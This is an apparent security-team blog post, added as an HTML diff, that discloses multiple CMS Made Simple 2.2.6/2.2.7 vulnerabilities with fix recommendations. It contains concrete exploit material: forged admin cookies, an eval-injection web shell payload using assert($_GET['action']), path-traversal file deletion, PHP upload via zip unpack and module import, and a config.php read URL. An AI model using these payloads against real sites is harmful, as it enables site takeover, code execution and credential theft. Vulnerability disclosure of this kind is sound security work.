@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		Cms Made Simple <= 2.2.7 Multiple Vulnerability -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="Symbo1 Security Team Post.">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Symbo1's RSS Feed" href="/feed.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="/projects">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+	</ul>
+</nav>
+
+		<main>
+			<style>
+	body{
+		word-break:break-word;
+	}
+</style>
+
+<div class="post-content">
+<div id="post">
+<h1 align="center">Cms Made Simple <= 2.2.7 Multiple Vulnerability</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">03 May 2018 - todaro</p>
+
+<h2 id="general-description">General description：</h2>
+
+<ol>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.6 contains admin password reset vulnerability(CVE-2018-10081)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.6 contains PHP object injection(CVE-2018-10085)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.6 contains the privilege escalation vulnerability from ordinary user to admin user(CVE-2018-10084)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 contains arbitrary code execution vulnerability in the admin dashboard(CVE-2018-10086)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 contains any file deletion vulnerability in the admin dashboard(CVE-2018-10083)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 contains web Site physical path leakage Vulnerability(CVE-2018-10082)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) 2.2.7 contains the privilege escalation vulnerability from ordinary user to admin user(CVE-2018-10519)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 “module import” operation in the admin dashboard contains remote code execution vulnerabilities(admin user)(CVE-2018-10517)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 “file unpack” operation in the admin dashboard contains remote code execution vulnerability(admin user)(CVE-2018-10515)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 “file view” operation in the admin dashboard contains sensitive information disclosure vulnerability(ordinary user)(CVE-2018-10522)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 “file rename” operation in the admin dashboard contains sensitive information disclosure vulnerability that can cause DOS(admin user)(CVE-2018-10516)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 “module remove” operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)(CVE-2018-10520)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 “file delete” operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)(CVE-2018-10518)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 “file move” operation in the admin dashboard contains arbitrary file movement vulnerability that can cause DOS(admin user)(CVE-2018-10521)</p>
+  </li>
+  <li>
+    <p>CMS Made Simple (CMSMS) &lt;=2.2.7 contains web Site physical path leakage Vulnerability(CVE-2018-10523)</p>
+  </li>
+</ol>
+
+<p><strong>Environment</strong>: apache/php 7.0.12/cms made simple 2.2.6 and cms made simple 2.2.7(update)</p>
+
+<h2 id="0x01-admin-password-reset-vulnerability-226">0x01 Admin password reset vulnerability (&lt;=2.2.6)</h2>
+
+<p>at /admin/login.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6b66d409.png" /></p>
+
+<p>line 129 calls the find_recovery_user function, passing in the <code class="highlighter-rouge">changepwhash</code> value if no null is returned, the password reset process will be entered</p>
+
+<p>in the find_recovery_user function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6d370a38.png" /></p>
+
+<p>on line 78, the password reset hash of all admin dashboard users is obtained directly from the database, and then compared with the value of <code class="highlighter-rouge">changepwhash</code> submitted by the user. If they are equal, the user is returned, otherwise null is returned.</p>
+
+<p>the problem here is that the hash of the password reset by the admin dashboard user is fixed, and the hash check is a weak type comparison, so there is the possibility of a password reset.</p>
+
+<p>for example, the admin user’s password reset hash starts with 0e.</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6d157cee.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6d4193f8.png" /></p>
+
+<p>you will see <code class="highlighter-rouge">0e123456 == 0e445678</code> but <code class="highlighter-rouge">0e123456 !== 0e445678</code></p>
+
+<p>To sum up: because the checked hash is not generated randomly everytime, it is always fixed, and because the hash check uses ==, so the hacker does not need to initiate the mailbox to obtain the hash to perform admin dashboard user password reset (hash starts with 0e)</p>
+
+<p>vulnerability fix recommendations: use <code class="highlighter-rouge">===</code> instead of <code class="highlighter-rouge">==</code>, hash should be dynamically generated</p>
+
+<h2 id="0x02-php-object-injection-226">0x02 PHP object injection (&lt;=2.2.6)</h2>
+
+<p>in the _get_data function of \lib\classes\internal\class.LoginOperations.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6d762b22.png" /></p>
+
+<p>line 117 gets the value of <code class="highlighter-rouge">$_COOKIE[$this-&gt;_loginkey]</code> by deserialization this function will be called when logging in the admin dashboard then the value of <code class="highlighter-rouge">$this-&gt;_loginkey</code> is fixed, so the next step is to construct the deserialization exploit chain.</p>
+
+<p>there is a __destruct function in class Smarty_Internal_Template of \lib\smarty\sysplugins\smarty_internal_template.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6d667536.png" /></p>
+
+<p>line 689 calls the releaseLock function of \lib\smarty\sysplugins\smarty_internal_cacheresource_file.php in this function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6d6661bf.png" /></p>
+
+<p>line 273 calls the unlink function to delete lock_id, so control lock_id to delete any file</p>
+
+<p>create a new file test.txt in the website root directory</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f6d822649.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f8385d236.png" /></p>
+
+<p>first specify the file to delete in poc.php then run poc.php to write the returned contents to unser.py line 55</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f8387b89e.png" /></p>
+
+<p>then execute python unser.py</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f83ece194.png" /></p>
+
+<p>the test.txt file has been deleted after execution</p>
+
+<p>vulnerability fix recommendations: use the json_decode function instead of the unserialize function</p>
+
+<h2 id="0x03-the-privilege-escalation-from-ordinary-user-to-admin-user-226">0x03 The privilege escalation from ordinary user to admin user (&lt;=2.2.6)</h2>
+
+<p>call the check_login function in line 35 of /admin/index.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f8388ad70.png" /></p>
+
+<p>in \lib\page.functions.php, line 88 calls the get_userid function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f83a7acf6.png" /></p>
+
+<p>in \lib\page.functions.php, line 43 calls the get_effective_uid function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f83d269c1.png" /></p>
+
+<p>in \lib\classes\internal\class.LoginOperations.php, line 183 calls the _get_data function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f83bd9add.png" /></p>
+
+<p>on line 182, if the data exists and both <code class="highlighter-rouge">eff_uid</code> and <code class="highlighter-rouge">eff_uid</code> exist in the data, the value of <code class="highlighter-rouge">eff_uid</code> is returned (<code class="highlighter-rouge">point of problem 1</code>).</p>
+
+<p>in the _get_data function of \lib\classes\internal\class.LoginOperations.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f83d04e20.png" /></p>
+
+<p>line 106 gets data from <code class="highlighter-rouge">$_COOKIE[$this-&gt;_loginkey]</code></p>
+
+<p><code class="highlighter-rouge">$this-&gt;_loginkey</code> comes from <code class="highlighter-rouge">md5(__FILE__.__CLASS__.CMS_VERSION)</code> the admin dashboard user can get the value in the cookie after logging in, and can also guess it directly</p>
+
+<p><code class="highlighter-rouge">__FILE__</code> –&gt;<code class="highlighter-rouge">" absolute path"\lib\classes\internal\class.LoginOperations.php</code>(refer to Appendix 1)</p>
+
+<p><code class="highlighter-rouge">__CLASS__</code> –&gt;<code class="highlighter-rouge">CMSMS\LoginOperations</code>(fixed value)</p>
+
+<p><code class="highlighter-rouge">CMS_VERSION</code> –&gt;<code class="highlighter-rouge">2.2.6</code>(fixed value,or 2.2.5/2.2.4/…)</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f83e73ea6.png" /></p>
+
+<p>on line 115, anti-counterfeiting verification is performed on the data, but there is a problem with the verification method(<code class="highlighter-rouge">point of problem 2</code>) (<code class="highlighter-rouge">refer to Appendix 2</code>).</p>
+
+<p>line 117 gets the value of <code class="highlighter-rouge">$_COOKIE[$this-&gt;_loginkey]</code> by deserialization</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f83d9ecc1.png" /></p>
+
+<p>on line 125, the _check_passhash function is called to verify the <code class="highlighter-rouge">id</code> and <code class="highlighter-rouge">cksum</code> values in the data</p>
+
+<p>in the _check_passhash function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c242e02.png" /></p>
+
+<p>line 56 obtains the user’s corresponding password through uid, merges some other parameters to serialize, and then sha1 encrypts it. finally, the cksum value submitted by the user is checked,if not equal, FALSE is returned, and the verification fails.</p>
+
+<p>To sum up: the key to exploiting the vulnerability is to falsify the <code class="highlighter-rouge">eff_uid</code> value in <code class="highlighter-rouge">$_COOKIE[$this-&gt;_loginkey]</code> to 1 (the admin user’s id), after which the cksum value is validated, and the data’s anti-forgery check is bypassed!</p>
+
+<p>Exploits: I wrote a vulnerability verification script. simply fill in the relevant parameters and you can let the admin dashboard ordinary users upgrade to the admin user.</p>
+
+<p>python poc.py</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9d016e48.png" /></p>
+
+<p>open /admin/index.php with the browser corresponding to user_agent in poc and jump to /admin/login.php</p>
+
+<p>clear all cookies</p>
+
+<p>then add the cookies generated by poc</p>
+
+<p>–&gt;<code class="highlighter-rouge">733200e27b06fbee203116934285f533</code>
+eb3b2b96e832bf7bf56a80f18a512857c5286473::YTo1OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjc6ImVmZl91aWQiO2k6MTtzOjEyOiJlZmZfdXNlcm5hbWUiO047czozOiJ1aWQiO2k6MjtzOjU6ImNrc3VtIjtzOjQwOiI4MzZjOGVhZDIwM2EyMTgwY2ExYmNlMjczOGU5NzBlODkzMjBhOTEyIjt9</p>
+
+<p>–&gt;<code class="highlighter-rouge">_sk_</code> aabbcc</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9cf5163e.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c291f52.png" /></p>
+
+<p>then request /admin/index.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c9ed837.png" /></p>
+
+<p>successfully become a admin user!</p>
+
+<p>Vulnerability fix recommendations: use a strong data encryption method.</p>
+
+<h2 id="0x04-arbitrary-code-execution-in-the-admin-dashboard-227">0x04 Arbitrary code execution in the admin dashboard (&lt;=2.2.7)</h2>
+
+<p>in \admin\editusertag.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c36fbbc.png" /></p>
+
+<p>line 93, execute the command directly using the eval function</p>
+
+<p>it was originally intended to place $code in testfunctionXXX(){}, but it was possible to jump out of the testfunctionXXX to execute arbitrary code because of lax filtering.</p>
+
+<p><code class="highlighter-rouge">$code</code> comes from <code class="highlighter-rouge">$code = $record['code'];</code> and <code class="highlighter-rouge">$record['code'] = trim($_POST['code']);</code></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c371475.png" /></p>
+
+<p>lines 80-81 limit the characters</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c4c18c0.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c37f30d.png" /></p>
+
+<p>line 105 stores <code class="highlighter-rouge">$code</code> and calls SetUserTag function to write to the database</p>
+
+<p>in the function CallUserTag of \lib\classes\class.usertagoperations.inc.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07f9c5e2b84.png" /></p>
+
+<p>line 285 calls call_user_func_array to execute the stored function code</p>
+
+<p>go to /admin/listusertags.php?sk=2e70dc0836332261d5c select a tag to edit and add as follows</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fae0be955.png" /></p>
+
+<p>}if(isset($_GET[‘action’])) @assert($_GET[‘action’]);/*</p>
+
+<p>then visit /index.php?action=phpinfo() the variable <code class="highlighter-rouge">action</code> is the command to be executed</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07faeb4f00d.png" /></p>
+
+<p>Vulnerability fix recommendations: filtering the data submitted by the user</p>
+
+<h2 id="0x05-any-file-deletion-in-the-admin-dashboard-227">0x05 Any file deletion in the admin dashboard (&lt;=2.2.7)</h2>
+
+<p>in \modules\FilePicker\action.ajax_cmd.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fade48e44.png" /></p>
+
+<p>line 15 gets the value of the <code class="highlighter-rouge">cwd</code> variable via post and removes the &lt;&gt; character in it</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fae03d8a3.png" /></p>
+
+<p>line 28 calls the is_relative function from \modules\FilePicker\lib\class.PathAssistant.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fae52b3b1.png" /></p>
+
+<p>line 65 calls the is_relative_to function in this function, the startswith function is called to compare the address from the value of the <code class="highlighter-rouge">cwd</code> variable and the absolute address of the default.</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fae207fd2.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fae209a0b.png" /></p>
+
+<p>line 13 gets the value of the <code class="highlighter-rouge">cmd</code> variable via post and filters it line 14 gets the value of the <code class="highlighter-rouge">val</code> variable via post</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fae9eefba.png" /></p>
+
+<p>line 40 When the <code class="highlighter-rouge">cmd</code> value is ‘del’, the delete operation is called</p>
+
+<p>To sum up: the default directory is /uploads/. to delete files from other directories, you can use /../ in the variable val.</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fae50e254.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07faeb40a00.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fbe92da50.png" /></p>
+
+<p>find a deletable file, click x and use burp to capture data</p>
+
+<p>–&gt;change the value of <code class="highlighter-rouge">val</code> to <code class="highlighter-rouge">/../$directory/$file</code></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fbe3b6f51.png" /></p>
+
+<p>/lib/test.php(a file created for testing) will be deleted</p>
+
+<p>once the important file is deleted, the website can not run properly</p>
+
+<p>Vulnerability fix recommendations: filtering the data submitted by the user</p>
+
+<h4 id="appendix-1">Appendix 1</h4>
+
+<h2 id="0x06-web-site-physical-path-leakage-vulnerability">0x06 Web Site physical path leakage Vulnerability</h2>
+
+<p>the following links can get the absolute path to the site /index.php?page=-100ssssss</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fbe9906ca.png" /></p>
+
+<p>/index.php?mact=Search%2Ccntnt01%2Cdosearch%2C0&amp;meb92freturnid=31&amp;meb92fsearchinput=aaa&amp;submit=Submit</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fbe49fc3e.png" /></p>
+
+<p>/admin/header.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c07fbe7ce19d.png" /></p>
+
+<p>/admin/footer.php /lib/tasks/class.ClearCache.task.php /lib/tasks/class.CmsSecurityCheck.task.php ……</p>
+
+<h4 id="appendix-2">Appendix 2</h4>
+
+<p>$tmp = [ md5(FILE),\cms_utils::get_real_ip(),$_SERVER[‘HTTP_USER_AGENT’].CMS_VERSION ];</p>
+
+<p>$salt = sha1(serialize($tmp));</p>
+
+<p>check:sha1( $parts[1].$salt ) != $parts[0] that is to let sha1( $parts[1].$salt ) == $parts[0]</p>
+
+<p>the FILE in md5(FILE) can be obtained from Appendix 1, so it is a fixed value</p>
+
+<p>\cms_utils::get_real_ip() gets the client ip, which is also a fixed value</p>
+
+<p>$_SERVER[‘HTTP_USER_AGENT’] gets the client browser user_agent, which is also a fixed value</p>
+
+<p>CMS_VERSION is also a fixed value</p>
+
+<p>therefore, the data to be verified against data falsification is a fixed value and can be obtained directly, so this verification can be bypassed.</p>
+
+<h2 id="0x07-the-privilege-escalation-from-ordinary-user-to-admin-user-227">0x07 The privilege escalation from ordinary user to admin user (2.2.7)</h2>
+
+<p>The previous CVE(http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10084) existed in cmsms version &lt;=2.2.6,and the authentication method was updated in the latest 2.2.7 version. However, there is still a privilege escalation vulnerability from ordinary user to admin user.</p>
+
+<p>Call the check_login function in line 35 of /admin/index.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801efb63f4.png" /></p>
+
+<p>In \lib\page.functions.php, line 88 calls the get_userid function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f149bc7.png" /></p>
+
+<p>In \lib\page.functions.php, line 43 calls the get_effective_uid function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f38d4a7.png" /></p>
+
+<p>In \lib\classes\internal\class.LoginOperations.php, line 183 calls the _get_data function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f230552.png" /></p>
+
+<p>On line 182, if the data exists and both eff_uid and eff_uid exist in the data, the value of eff_uid is returned (<code class="highlighter-rouge">problem 1</code>).</p>
+
+<p>(<code class="highlighter-rouge">The following is the function updated in version 2.2.7</code>)</p>
+
+<p>In the _get_data function of \lib\classes\internal\class.LoginOperations.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f3141fa.png" /></p>
+
+<p>Line 106 gets data from <code class="highlighter-rouge">$_COOKIE[$this-&gt;_loginkey]</code></p>
+
+<p><code class="highlighter-rouge">$this-&gt;_loginkey</code> comes from <code class="highlighter-rouge">sha1( CMS_VERSION.$this-&gt;_get_salt() );</code></p>
+
+<p>The admin dashboard users can get the value in the cookie after logging in, and can also be guessed directly</p>
+
+<p><code class="highlighter-rouge">CMS_VERSION</code> –&gt;2.2.7 (fixed value)</p>
+
+<p>get_salt function is as follows</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f342088.png" /></p>
+
+<p>Line 51 calls \cms_siteprefs::get(<strong>CLASS</strong>) to get the value of <code class="highlighter-rouge">$salt</code></p>
+
+<p><strong>CLASS</strong> is a fixed value: CMSMS\LoginOperations</p>
+
+<p>In the \cms_siteprefs::get function of \lib\classes\class.cms_siteprefs.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f220555.png" /></p>
+
+<p>Line 86 calls the global_cache::get function, the current <strong>CLASS</strong> is a fixed value: cms_siteprefs</p>
+
+<p>In the global_cache::get function of \lib\classes\internal\class.global_cache.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f3ebb0d.png" /></p>
+
+<p>Line 23 calls the _load function In the _load function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f39ad96.png" /></p>
+
+<p>Line 76 calls the get function of \lib\classes\class.cms_filecache_driver.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c0801f2e95c3.png" /></p>
+
+<p>Line 146 calls the _get_filename function to get the name of the last cached file</p>
+
+<p>Line 147 reads the value of the cache file through the _read_cache_file function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf5d619db.png" /></p>
+
+<p>You can see that the parameters that make up the cache file name are both fixed and guessable (<code class="highlighter-rouge">problem 2</code>)</p>
+
+<p>And the files in the /tmp/ directory are all directly accessible via the web (<code class="highlighter-rouge">problem 3</code>)</p>
+
+<p>And the value read from the cache file is also the encrypted value to be used later in the data tamper verification. So we can get this value by guessing the file name and then reading the cache file directly.</p>
+
+<p>Back to _get_data function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf5e1a20f.png" /></p>
+
+<p>Line 115 gets the value in the cookie and is divided into <code class="highlighter-rouge">part0::part1</code></p>
+
+<p>Line 118 checks the data to prevent data from being tampered with</p>
+
+<p>If the value of <code class="highlighter-rouge">part0</code> is not equal to <code class="highlighter-rouge">sha1 ($salt.part1)</code> cmsms will not continue to execute the code</p>
+
+<p>We already mentioned that this <code class="highlighter-rouge">$salt</code> value can be obtained, so we can bypass this check</p>
+
+<p>The line 119 performs base64decode processing on the <code class="highlighter-rouge">part1</code> value and then processes it with json_decode (&lt;2.2.7 version uses unserialize function, which also leads to the PHP object injection vulnerability).</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf6078376.png" /></p>
+
+<p>Line 128 also checks the <code class="highlighter-rouge">hash</code> in the data. This value is related to the user’s password, so we need to have a ordinary user account in the admin dashboard.</p>
+
+<p>To sum up: the key to exploiting the vulnerability is to falsify the <code class="highlighter-rouge">eff_uid</code> value in <code class="highlighter-rouge">$_COOKIE[$this-&gt;_loginkey]</code> to 1 (the admin user’s id), and then bypass the data’s anti-counterfeiting verification.</p>
+
+<p>Exploits: I wrote a vulnerability verification script. simply fill in the relevant parameters and you can let the admin dashboard ordinary users upgrade to the admin user.</p>
+
+<p>python cmsms_2_2_7_poc.py</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf6c73029.png" /></p>
+
+<p>Using browser to open /admin/index.php will jump to /admin/login.php</p>
+
+<p>Emptying cookies</p>
+
+<p>Then add the cookie generated by the POC</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="mi">8624</span><span class="nx">fce6d211b248d0ec7f93c4797b3ad80e8308</span>
+<span class="o">--&gt;</span><span class="mi">4</span><span class="nx">a81ada13ba84ebaa0956bb1b287d333a605d424</span><span class="p">::</span><span class="nx">eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJlZmZfdWlkIjogMSwgImVmZl91c2VybmFtZSI6IG51bGwsICJ1aWQiOiAyLCAiaGFzaCI6ICIkMnkkMTAkL3d0c2poZ2ZmM25kOG5oWkIxdGVsTzdJZFFKR1o2L0htLnZjQy56aE8xTE01bko1Z1FMOHUifQ</span><span class="o">==</span>
+
+<span class="nx">__c</span>
+<span class="o">--&gt;</span><span class="mi">512919</span><span class="nx">d4312874cba5d</span></code></pre></figure>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf663dc8c.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf61c675a.png" /></p>
+
+<p>Then revisit /admin/index.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf67089f4.png" /></p>
+
+<p>Successfully become a admin user!</p>
+
+<p>Vulnerability fix recommendations: Modify the user authentication logic and also restrict the direct access to the tmp directory.</p>
+
+<h2 id="0x08-cms-made-simple-cmsms-227-module-import-operation-in-the-admin-dashboard-contains-remote-code-execution-vulnerabilitiesadmin-user">0x08 CMS Made Simple (CMSMS) &lt;=2.2.7 “module import” operation in the admin dashboard contains remote code execution vulnerabilities(admin user)</h2>
+
+<p>In \modules\ModuleManager\action.local_import.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf5bd3ef4.png" /></p>
+
+<p>Line 23 calls the ExpandXMLPackage function of \lib\classes\class.moduleoperations.inc.php</p>
+
+<p>This function will call xml to read the contents of the file</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf67d51bd.png" /></p>
+
+<p>This function reads the value of as the file name Read the value of as the contents of the file Then generate the file</p>
+
+<p>To sum up: the whole process, CMSMS does not restrict the file type in the process of generating files, resulting in hackers can generate executable .PHP files.</p>
+
+<p>Exploits: Create a test.xml first</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08cf5cd4011.png" /></p>
+
+<p>Enter</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0af4669f.png" /></p>
+
+<p>Click on “Import Module” operation and select test.xml Visit /modules/test/test.php after submitting</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0b1dd917.png" /></p>
+
+<p>Vulnerability fix recommendations: This may be a function rather than a vulnerability for developers. But from the website security point of view, I still recommend that developers should modify this function: after all the module code is uploaded to the server via FTP(rather than by importing xml and automatically generating a file), the admin can choose to install the module.The consideration for this is that the admin is sure to have permission to upload code via FTP, but the hackers do not, so the security of the website is guaranteed.</p>
+
+<h2 id="0x09-cms-made-simple-cmsms-227-file-unpack-operation-in-the-admin-dashboard-contains-remote-code-execution-vulnerabilityadmin-user">0x09 CMS Made Simple (CMSMS) &lt;=2.2.7 “file unpack” operation in the admin dashboard contains remote code execution vulnerability(admin user)</h2>
+
+<p>In the \modules\FileManager\action.fileaction.php file</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0afc5361.png" /></p>
+
+<p>Enter the decompression process when there is a m1_fileactionunpack parameter or its value is unpack.</p>
+
+<p>Call \modules\FileManager\action.unpack.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0b046834.png" /></p>
+
+<p>Line 25 gets the name of the file to extract</p>
+
+<p>Line 35 calls the extract function of class EasyArchive</p>
+
+<p>In the extract function of \modules\FileManager\easyarchives\EasyArchive.class.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0afd4ec9.png" /></p>
+
+<p>Line 165 determines that the file is a zip archive Line 168 decompresses the file directly</p>
+
+<p>To sum up: you can see that the file in the compressed package is not judged in the whole process, so if the .php file is included in the compressed package, it will be released to the server directory after the decompression, causing the code to execute!</p>
+
+<p>Exploits: Prepare a test.php file first</p>
+
+<p>Content is <code class="highlighter-rouge">&lt;?php phpinfo();?&gt;</code></p>
+
+<p>Compress it into test.zip</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0afb18ce.png" /></p>
+
+<p>Enter</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0afd5407.png" /></p>
+
+<p>Upload test.zip file</p>
+
+<p>Select test.zip and select “Unpack” operation</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0b287938.png" /></p>
+
+<p>Will generate test.php in the current directory</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0b260b0b.png" /></p>
+
+<p>Access the file, the php file is executed</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d0b2d8b6c.png" /></p>
+
+<p>Vulnerability fix recommendations: when decompressing a file, determine the file type and limit the .php file to be uncompressed to the server.</p>
+
+<h2 id="0x10-cms-made-simple-cmsms-227-file-view-operation-in-the-admin-dashboard-contains-sensitive-information-disclosure-vulnerabilityordinary-user">0x10 CMS Made Simple (CMSMS) &lt;=2.2.7 “file view” operation in the admin dashboard contains sensitive information disclosure vulnerability(ordinary user)</h2>
+
+<p>In \modules\FileManager\action.view.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2423bf9e.png" /></p>
+
+<p>Line 12 gets the value of file and handles it with the base64decode function</p>
+
+<p>Line 13 gets the absolute address of the file</p>
+
+<p>Line 14 determines that the file exists</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2423b9d9.png" /></p>
+
+<p>Line 30 gets the contents of the file</p>
+
+<p>To sum up: the whole process, after obtaining the file name submitted by the user, CMSMS only carries out the identification of the file existence, does not restrict the directory, and does not judge whether the user is the admin,so any ordinary user in the admin dashboard can read any file content of the website.</p>
+
+<p>Exploits: Use admin dashboard ordinary user test1 to log in</p>
+
+<p>Then request the following URL (replace the value of __c with your own value, base64decode(‘Li5cY29uZmlnLnBocA==’) is ..\config.php)</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">moduleinterface</span><span class="p">.</span><span class="nx">php</span><span class="p">?</span><span class="nx">mact</span><span class="o">=</span><span class="nx">FileManager</span><span class="p">,</span><span class="nx">m1_</span><span class="p">,</span><span class="nx">view</span><span class="p">,</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">__c</span><span class="o">=</span><span class="nx">b3d2a517e18bf23a60b</span><span class="o">&amp;</span><span class="nx">m1_ajax</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">showtemplate</span><span class="o">=</span><span class="kc">false</span><span class="o">&amp;</span><span class="nx">m1_file</span><span class="o">=</span><span class="nx">Li5cY29uZmlnLnBocA</span><span class="o">==</span></code></pre></figure>
+
+<p>Click “view-source” to see the contents of /config.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d244ba0a3.png" /></p>
+
